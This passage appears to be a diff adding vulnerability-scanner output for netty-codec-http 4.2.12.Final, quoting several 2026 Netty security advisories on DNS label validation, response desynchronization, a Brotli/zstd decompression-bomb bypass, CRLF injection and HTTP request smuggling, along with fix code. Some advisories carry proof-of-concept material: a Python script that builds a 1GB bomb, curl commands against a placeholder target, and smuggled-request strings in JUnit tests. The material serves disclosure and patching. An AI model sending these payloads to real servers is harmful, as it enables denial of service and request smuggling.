+                        │      │                     Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65
+                        │      │                   03 63 6f 6d 00
+                        │      │                     Null byte in label data: true
+                        │      │                     VULNERABLE: YES - Null byte accepted!
+                        │      │                   [TEST 2] Label > 63 bytes in encoder
+                        │      │                     Input: "aaaaaa..." (200-char label)
+                        │      │                     Encoded bytes: 206
+                        │      │                     VULNERABLE: YES - Overlength label accepted in encoder!
+                        │      │                   [TEST 3] Empty labels (consecutive dots)
+                        │      │                     Input: "a..b.com"
+                        │      │                     Encoded bytes: 01 61 00
+                        │      │                     Note: Empty label truncates the name (may lose data)
+                        │      │                   **Decoder PoC:**
+                        │      │                   === Netty DNS Decoder Length Bypass PoC ===
+                        │      │                   [TEST 1] Label > 63 bytes (RFC 1035 violation)
+                        │      │                     Label length: 100 bytes (RFC limit: 63)
+                        │      │                     Decoded name length: 105
+                        │      │                     VULNERABLE: YES - Label > 63 bytes accepted!
+                        │      │                   [TEST 2] Domain > 255 bytes via multiple labels
+                        │      │                     5 labels x 60 bytes = 300+ bytes total
+                        │      │                     RFC 1035 limit: 255 bytes
+                        │      │                     Decoded name length: 305
+                        │      │                     VULNERABLE: YES - Domain > 255 bytes accepted!
+                        │      │                   ## 7. Impact Analysis
+                        │      │                   | Impact Category | Description |
+                        │      │                   |----------------|-------------|
+                        │      │                   | **Integrity** | HIGH — Null byte injection causes
+                        │      │                   differential interpretation across DNS implementations |
+                        │      │                   | **Availability** | HIGH — Malicious DNS responses can
+                        │      │                   cause unbounded memory allocation via decoder |
+                        │      │                   | **DNS Cache Poisoning** | Different parsers see different
+                        │      │                   domain names from the same encoded packet |
+                        │      │                   | **Domain Validation Bypass** | Null bytes can bypass
+                        │      │                   allowlist/blocklist checks in DNS proxies |
+                        │      │                   | **Label/Pointer Confusion** | Length bytes > 63 conflict
+                        │      │                   with RFC 1035 compression pointer encoding |
+                        │      │                   | **Silent Truncation** | Empty labels silently drop the
+                        │      │                   remainder of the domain name |
+                        │      │                   | **Downstream Failures** | Oversized domain names may crash
+                        │      │                    certificate validators, URL parsers, or other DNS-aware
+                        │      │                   libraries |
+                        │      │                   ## 8. Remediation Recommendations
+                        │      │                   ### Fix for Encoder (encodeDomainName)
+                        │      │                       int totalLength = 0;
+                        │      │                               throw new IllegalArgumentException("DNS name
+                        │      │                   contains empty label: " + name);
+                        │      │                           if (labelLen > 63) {
+                        │      │                               throw new IllegalArgumentException(
+                        │      │                                   "DNS label length " + labelLen + " exceeds
+                        │      │                   maximum of 63: " + name);
+                        │      │                           for (int i = 0; i < label.length(); i++) {
+                        │      │                               if (label.charAt(i) == '\0') {
+                        │      │                                   throw new IllegalArgumentException(
+                        │      │                                       "DNS label contains null byte at index "
+                        │      │                    + i);
+                        │      │                               }
+                        │      │                           totalLength += 1 + labelLen;
+                        │      │                           if (totalLength > 254) {
+                        │      │                                   "DNS name exceeds maximum length of 255: " +
+                        │      │                    name);
+                        │      │                           buf.writeByte(labelLen);
+                        │      │                           ByteBufUtil.writeAscii(buf, label);
+                        │      │                   ### Fix for Decoder (decodeDomainName)
+                        │      │                   // Add after "} else if (len != 0) {":
+                        │      │                   if (len > 63) {
+                        │      │                       throw new CorruptedFrameException("DNS label length " +
+                        │      │                   len + " exceeds maximum of 63");
+                        │      │                   // Add after "name.append(...)":
+                        │      │                   if (name.length() > 255) {
+                        │      │                       throw new CorruptedFrameException("DNS domain name
+                        │      │                   length exceeds maximum of 255");
+                        │      │                   ## 9. Resources
+                        │      │                   - [RFC 1035 Section 2.3.4: Size
+                        │      │                   Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
+                        │      │                   - [RFC 1035 Section 4.1.4: Message
+                        │      │                   Compression](https://tools.ietf.org/html/rfc1035#section-4.1
+                        │      │                   .4)
+                        │      │                   - [CWE-20: Improper Input
+                        │      │                   Validation](https://cwe.mitre.org/data/definitions/20.html)
+                        │      │                   - [CWE-400: Uncontrolled Resource
+                        │      │                   Consumption](https://cwe.mitre.org/data/definitions/400.html
+                        │      │                   )
+                        │      │                   - [CWE-626: Null Byte Interaction
+                        │      │                   Error](https://cwe.mitre.org/data/definitions/626.html) 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N 
+                        │      │                         ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ├ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                         │      A-cm33-6792-r9fm 
+                        │                         ├ [2]: https://tools.ietf.org/html/rfc1035#section-2.3.4 
+                        │                         ╰ [3]: https://tools.ietf.org/html/rfc1035#section-4.1.4 
+                        ├ [2]  ╭ VulnerabilityID : CVE-2026-42584 
+                        │      ├ VendorIDs        ─ [0]: GHSA-57rv-r2g8-2cj3 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42584 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:138c25aeebd79616619b94270d69dfd09bb9ef5e576cded2f5f9d
+                        │      │                   83c459589cc 
+                        │      ├ Title           : Netty has HttpClientCodec response desynchronization 
+                        │      ├ Description     : ### Summary
+                        │      │                    If HttpClientCodec is configured, there are use cases when
+                        │      │                   a response body from one request, can be parsed as
+                        │      │                   another's.
+                        │      │                   
+                        │      │                   ### Details
+                        │      │                   HttpClientCodec pairs each inbound response with an outbound
+                        │      │                    request by `queue.poll()` once per response, including for
+                        │      │                   `1xx`. If the client pipelines GET then HEAD and the server
+                        │      │                   sends 103, then 200 with GET body, then 200 for HEAD, the
+                        │      │                   queue pairs HEAD with the first 200. The HEAD rule then
+                        │      │                   skips reading that message’s body, so the GET entity bytes
+                        │      │                   stay on the stream and the following 200 is parsed from the
+                        │      │                   wrong offset.
+                        │      │                   Prerequisites 
+                        │      │                   - HTTP/1.1 pipelining
+                        │      │                   - HEAD in the pipeline
+                        │      │                   - The server sends 1xx
+                        │      │                   ### PoC
+                        │      │                   ```java
+                        │      │                       @Test
+                        │      │                       public void test() {
+                        │      │                           EmbeddedChannel channel = new EmbeddedChannel(new
+                        │      │                   HttpClientCodec());
+                        │      │                           assertTrue(channel.writeOutbound(new
+                        │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET,
+                        │      │                    "/1")));
+                        │      │                           ByteBuf request = channel.readOutbound();
+                        │      │                           request.release();
+                        │      │                           assertNull(channel.readOutbound());
+                        │      │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1,
+                        │      │                   HttpMethod.HEAD, "/2")));
+                        │      │                           request = channel.readOutbound();
+                        │      │                           String responseStr = "HTTP/1.1 103 Early
+                        │      │                   Hints\r\n\r\n" +
+                        │      │                                   "HTTP/1.1 200 OK\r\nContent-Length:
+                        │      │                   5\r\n\r\nhello" +
+                        │      │                                   "HTTP/1.1 200 OK\r\n\r\n";
+                        │      │                          
+                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(respon
+                        │      │                   seStr, CharsetUtil.US_ASCII)));
+                        │      │                           // Response 1
+                        │      │                           HttpResponse response = channel.readInbound();
+                        │      │                           assertEquals(HttpResponseStatus.EARLY_HINTS,
+                        │      │                   response.status());
+                        │      │                           LastHttpContent last = channel.readInbound();
+                        │      │                           assertEquals(0, last.content().readableBytes());
+                        │      │                           last.release();
+                        │      │                           // Response 2
+                        │      │                           response = channel.readInbound();
+                        │      │                           assertEquals(HttpResponseStatus.OK,
+                        │      │                           last = channel.readInbound();
+                        │      │                           // Response 3
+                        │      │                           FullHttpResponse response1 = channel.readInbound();
+                        │      │                           assertTrue(response1.decoderResult().isFailure());
+                        │      │                           assertEquals(0,
+                        │      │                   response1.content().readableBytes());
+                        │      │                           response1.release();
+                        │      │                           assertFalse(channel.finish());
+                        │      │                       }
+                        │      │                   ```
+                        │      │                   ### Impact
+                        │      │                   Integrity/availability of HTTP parsing on that connection,
+                        │      │                   unsafe reuse of the socket. 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L 
+                        │      │                         ╰ V3Score : 7.3 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-57rv-r2g8-2cj3 
+                        ├ [3]  ╭ VulnerabilityID : CVE-2026-42587 
+                        │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de81513
+                        │      │                   911ed991da4 
+                        │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
+                        │      │                   Content-Encoding set to br/zstd/snappy leads to
+                        │      │                   decompression bomb DoS 
+                        │      ├ Description     : ## Summary
+                        │      │                   
+                        │      │                   `HttpContentDecompressor` accepts a `maxAllocation`
+                        │      │                   parameter to limit decompression buffer size and prevent
+                        │      │                   decompression bomb attacks. This limit is correctly enforced
+                        │      │                    for gzip and deflate encodings via `ZlibDecoder`, but is
+                        │      │                   silently ignored when the content encoding is `br` (Brotli),
+                        │      │                    `zstd`, or `snappy`. An attacker can bypass the configured
+                        │      │                   decompression limit by sending a compressed payload with
+                        │      │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
+                        │      │                   causing unbounded memory allocation and out-of-memory denial
+                        │      │                    of service.
+                        │      │                   The same vulnerability exists in
+                        │      │                   `DelegatingDecompressorFrameListener` for HTTP/2
+                        │      │                   connections.
+                        │      │                   ## Details
+                        │      │                   `HttpContentDecompressor` stores the `maxAllocation` value
+                        │      │                   at construction time (`HttpContentDecompressor.java:89`) and
+                        │      │                    uses it in `newContentDecoder()` to create the appropriate
+                        │      │                   decompression handler.
+                        │      │                   For gzip/deflate, `maxAllocation` is forwarded to
+                        │      │                   `ZlibCodecFactory.newZlibDecoder()`:
+                        │      │                   ```java
+                        │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS
+                        │      │                   enforced
+                        │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
+                        │      │                   maxAllocation))
+                        │      │                   ```
+                        │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
+                        │      │                   hard cap by setting the buffer's `maxCapacity` and throwing
+                        │      │                   `DecompressionException` when the limit is reached:
+                        │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
+                        │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
+                        │      │                   maxAllocation), maxAllocation);
+                        │      │                   // ZlibDecoder.java:80 — throws when exceeded
+                        │      │                   throw new DecompressionException("Decompression buffer has
+                        │      │                   reached maximum size: " + buffer.maxCapacity());
+                        │      │                   For brotli, zstd, and snappy, the decoders are created
+                        │      │                   without any size limit:
+                        │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
+                        │      │                   .handlers(new BrotliDecoder())
+                        │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
+                        │      │                   .handlers(new SnappyFrameDecoder())
+                        │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
+                        │      │                   .handlers(new ZstdDecoder())
+                        │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
+                        │      │                   there is no way to constrain its output. It streams
+                        │      │                   decompressed data in chunks via `fireChannelRead` with no
+                        │      │                   total limit.
+                        │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
+                        │      │                   but this only constrains individual buffer allocations, not
+                        │      │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
+                        │      │                   creates new buffers and fires `channelRead` repeatedly, so
+                        │      │                   total decompressed output is unbounded.
+                        │      │                   The identical pattern exists in
+                        │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor(
+                        │      │                   )` at lines 188-210 for HTTP/2.
+                        │      │                   ## PoC
+                        │      │                   1. Configure a Netty HTTP server with decompression bomb
+                        │      │                   protection:
+                        │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
+                        │      │                   1MB max
+                        │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
+                        │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
+                        │      │                   decompressed):
+                        │      │                   ```python
+                        │      │                   import brotli
+                        │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
+                        │      │                   compressed = brotli.compress(bomb, quality=11)
+                        │      │                   with open('bomb.br', 'wb') as f:
+                        │      │                       f.write(compressed)
+                        │      │                   # compressed size: ~1KB
+                        │      │                   3. Send the bomb with gzip encoding (BLOCKED by
+                        │      │                   maxAllocation):
+                        │      │                   ```bash
+                        │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
+                        │      │                   curl -X POST http://target:8080/api \
+                        │      │                     -H 'Content-Encoding: gzip' \
+                        │      │                     --data-binary @bomb.gz
+                        │      │                   # Result: DecompressionException thrown at 1MB
+                        │      │                   4. Send the same bomb with brotli encoding (BYPASSES
+                        │      │                   # This bypasses the limit — BrotliDecoder has no
+                        │      │                   maxAllocation
+                        │      │                     -H 'Content-Encoding: br' \
+                        │      │                     --data-binary @bomb.br
+                        │      │                   # Result: Full 1GB decompressed into memory → OOM
+                        │      │                   5. The same bypass works with `Content-Encoding: zstd` and
+                        │      │                   `Content-Encoding: snappy`.
+                        │      │                   ## Impact
+                        │      │                   - **Denial of Service**: An attacker can cause out-of-memory
+                        │      │                    conditions on any Netty server that relies on
+                        │      │                   `maxAllocation` for decompression bomb protection, by simply
+                        │      │                    using a non-gzip content encoding.
+                        │      │                   - **False sense of security**: Developers who explicitly
+                        │      │                   configure `maxAllocation` to protect against decompression
+                        │      │                   bombs are not actually protected for brotli, zstd, or snappy
+                        │      │                    encodings. The API documentation implies all encodings are
+                        │      │                   covered.
+                        │      │                   - **Trivial bypass**: The attacker only needs to change one
+                        │      │                   HTTP header (`Content-Encoding: br` instead of
+                        │      │                   `Content-Encoding: gzip`) to circumvent the protection
+                        │      │                   entirely.
+                        │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
+                        │      │                   both `HttpContentDecompressor` (HTTP/1.1) and
+                        │      │                   `DelegatingDecompressorFrameListener` (HTTP/2).
+                        │      │                   ## Recommended Fix
+                        │      │                   Pass `maxAllocation` to all decoder constructors. For
+                        │      │                   `BrotliDecoder`, which currently has no `maxAllocation`
+                        │      │                   support, add the parameter:
+                        │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all
+                        │      │                    decoders:
+                        │      │                   // Line 120: BrotliDecoder — add maxAllocation support
+                        │      │                   .handlers(new BrotliDecoder(maxAllocation))
+                        │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
+                        │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
+                        │      │                   // Line 138: ZstdDecoder — forward the configured
+                        │      │                   .handlers(new ZstdDecoder(maxAllocation))
+                        │      │                   **DelegatingDecompressorFrameListener.java** — same fix at
+                        │      │                   lines 188-210.
+                        │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the
+                        │      │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
+                        │      │                   set buffer maxCapacity and throw `DecompressionException`
+                        │      │                   when the total decompressed output exceeds the limit.
+                        │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
+                        │      │                   equivalent enforcement.
+                        │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
+                        │      │                   total output across all buffers is bounded (not just
+                        │      │                   per-buffer allocation size). 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+                        │      │                         ╰ V3Score : 7.5 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-f6hv-jmp6-3vwv 
+                        ├ [4]  ╭ VulnerabilityID : CVE-2026-41417 
+                        │      ├ VendorIDs        ─ [0]: GHSA-v8h7-rr48-vmmv 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41417 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:f4a0586c7efa06b5be3a3e07773923f8635330ac5f65bcf26e69c
+                        │      │                   32024203274 
+                        │      ├ Title           : Netty allows request-line validation to be bypassed when a
+                        │      │                   `DefaultHtt ... 
+                        │      ├ Description     : Netty allows request-line validation to be bypassed when a
+                        │      │                   `DefaultHttpRequest` or `DefaultFullHttpRequest` is created
+                        │      │                   first and its URI is later changed via `setUri()`. The
+                        │      │                   constructors reject CRLF and whitespace characters that
+                        │      │                   would break the start-line, but `setUri()` does not apply
+                        │      │                   the same validation. `HttpRequestEncoder` and `RtspEncoder`
+                        │      │                   then write the URI into the request line verbatim. If
+                        │      │                   attacker-controlled input reaches `setUri()`, this enables
+                        │      │                   CRLF injection and insertion of additional HTTP or RTSP
+                        │      │                   requests, leading to HTTP request smuggling or
+                        │      │                   desynchronization on the HTTP side and request injection on
+                        │      │                   the RTSP side. This issue is fixed in versions 4.2.13.Final
+                        │      │                   and 4.1.133.Final. 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ CweIDs           ╭ [0]: CWE-93 
+                        │      │                  ╰ [1]: CWE-444 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
+                        │      │                         ╰ V3Score : 5.3 
+                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
+                        │      │                  ├ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │      │                  │      A-v8h7-rr48-vmmv 
+                        │      │                  ╰ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-41417 
+                        │      ├ PublishedDate   : 2026-05-06T22:16:25.78Z 
+                        │      ╰ LastModifiedDate: 2026-05-07T15:16:06.703Z 
+                        ├ [5]  ╭ VulnerabilityID : CVE-2026-42580 
+                        │      ├ VendorIDs        ─ [0]: GHSA-m4cv-j2px-7723 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42580 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:4a1f7648faaae5f2fe2b199fcefea9c71ca19cbe14ae6a3cff79b
+                        │      │                   56226947af6 
+                        │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to incorrect
+                        │      │                   chunk size parsing 
+                        │      ├ Description     : ### Summary
+                        │      │                   Netty's chunk size parser silently overflows int, enabling
+                        │      │                   request smuggling attacks.
+                        │      │                   
+                        │      │                   ### Details
+                        │      │                   io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize
+                        │      │                   silently overflows int.
+                        │      │                   The size is accumulated as follows:
+                        │      │                   result *= 16;
+                        │      │                   result += digit;
+                        │      │                   The result is checked only for negative values. However,
+                        │      │                   with a carefully crafted chunk size, the result can be a
+                        │      │                   valid size.
+                        │      │                   ### PoC
+                        │      │                   The test below shows Netty successfully parsing the second
+                        │      │                   request, demonstrating how an attacker can smuggle a second
+                        │      │                   request inside a chunked body.
+                        │      │                   ```java
+                        │      │                   @Test
+                        │      │                   public void test() {
+                        │      │                       String requestStr = "POST / HTTP/1.1\r\n" +
+                        │      │                               "Host: localhost\r\n" +
+                        │      │                               "Transfer-Encoding: chunked\r\n\r\n" +
+                        │      │                               "100000004\r\n" +
+                        │      │                               "test\r\n" +
+                        │      │                               "0\r\n" +
+                        │      │                               "\r\n" +
+                        │      │                               "GET /smuggled HTTP/1.1\r\n" +
+                        │      │                               "Content-Length: 0\r\n" +
+                        │      │                               "\r\n";
+                        │      │                       EmbeddedChannel channel = new EmbeddedChannel(new
+                        │      │                   HttpRequestDecoder());
+                        │      │                      
+                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(reques
+                        │      │                   tStr, CharsetUtil.US_ASCII)));
+                        │      │                       // Request 1
+                        │      │                       HttpRequest request = channel.readInbound();
+                        │      │                       assertTrue(request.decoderResult().isSuccess());
+                        │      │                       HttpContent content = channel.readInbound();
+                        │      │                       assertTrue(content.decoderResult().isSuccess());
+                        │      │                       assertEquals("test",
+                        │      │                   content.content().toString(CharsetUtil.US_ASCII));
+                        │      │                       content.release();
+                        │      │                       LastHttpContent last = channel.readInbound();
+                        │      │                       assertTrue(last.decoderResult().isSuccess());
+                        │      │                       last.release();
+                        │      │                       // Request 2
+                        │      │                       request = channel.readInbound();
+                        │      │                       last = channel.readInbound();
+                        │      │                   }
+                        │      │                   ```
+                        │      │                   ### Impact
+                        │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
+                        │      │                   requests 
+                        │      ├ Severity        : MEDIUM 
+                        │      ├ VendorSeverity   ─ ghsa: 2 
+                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L 
+                        │      │                         ╰ V3Score : 6.5 
+                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
+                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-m4cv-j2px-7723 
+                        ├ [6]  ╭ VulnerabilityID : CVE-2026-42581 
+                        │      ├ VendorIDs        ─ [0]: GHSA-xxqh-mfjm-7mv9 
+                        │      ├ PkgName         : io.netty:netty-codec-http 
+                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
+                        │      │                  ╰ UID : 42139b2b89dda2f4 
+                        │      ├ InstalledVersion: 4.2.12.Final 
+                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                        │      │                  │         94edd8ebe468fc57d07e 
+                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                        │      │                            e0961a5292bd158a4dcf 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42581 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:e06e8aca9203849f5db02e2419dd256a6f1f2ce2ba486922754db
+                        │      │                   f2c20029b19 
+                        │      ├ Title           : Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
+                        │      │                   Sanitization 
+                        │      ├ Description     : # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
+                        │      │                   Sanitization
+                        │      │                   
+                        │      │                   | Field     | Value |
+                        │      │                   |-----------|-------|
+                        │      │                   | Library   | `io.netty:netty-codec-http` |
+                        │      │                   | Component | `codec-http` — `HttpObjectDecoder` |
+                        │      │                   | Severity  | **HIGH** |
+                        │      │                   | Affects   | HEAD, commit `4f3533ae` confirmed |
+                        │      │                   ---
+                        │      │                   ## Summary
+                        │      │                   `HttpObjectDecoder` strips a conflicting `Content-Length`
+                        │      │                   header when a request carries both `Transfer-Encoding:
+                        │      │                   chunked` and `Content-Length`, but only for HTTP/1.1
+                        │      │                   messages. The guard is absent for HTTP/1.0. An attacker that
+                        │      │                    sends an HTTP/1.0 request with both headers causes Netty to
+                        │      │                    decode the body as chunked while leaving `Content-Length`
+                        │      │                   intact in the forwarded `HttpMessage`. Any downstream proxy
+                        │      │                   or handler that trusts `Content-Length` over
+                        │      │                   `Transfer-Encoding` will disagree on message boundaries,
+                        │      │                   enabling request smuggling.
+                        │      │                   ## Root Cause
+                        │      │                   ```java
+                        │      │                   // HttpObjectDecoder.java:828-833
+                        │      │                   if (HttpUtil.isTransferEncodingChunked(message)) {
+                        │      │                       this.chunked = true;
+                        │      │                       if (!contentLengthFields.isEmpty() &&
+                        │      │                   message.protocolVersion() == HttpVersion.HTTP_1_1) {
+                        │      │                          
+                        │      │                   handleTransferEncodingChunkedWithContentLength(message);  //
+                        │      │                    strips CL — HTTP/1.1 only
+                        │      │                       }
+                        │      │                       return State.READ_CHUNK_SIZE;
+                        │      │                   }
+                        │      │                   // HttpObjectDecoder.java:870-873
+                        │      │                   protected void
+                        │      │                   handleTransferEncodingChunkedWithContentLength(HttpMessage
+                        │      │                   message) {
+                        │      │                      
+                        │      │                   message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
+                        │      │                       contentLength = Long.MIN_VALUE;
+                        │      │                   ```
+                        │      │                   The conflict-resolution path is gated on
+                        │      │                   `message.protocolVersion() == HttpVersion.HTTP_1_1`. When
+                        │      │                   the request declares `HTTP/1.0`, the condition is false,
+                        │      │                   `handleTransferEncodingChunkedWithContentLength` is never
+                        │      │                   called, and the `Content-Length` header survives into the
+                        │      │                   forwarded message. Netty still processes the body as
+                        │      │                   chunked; a downstream component that is CL-first interprets
+                        │      │                   the same bytes as a separate request.
+                        │      │                   ## Proof of Concept
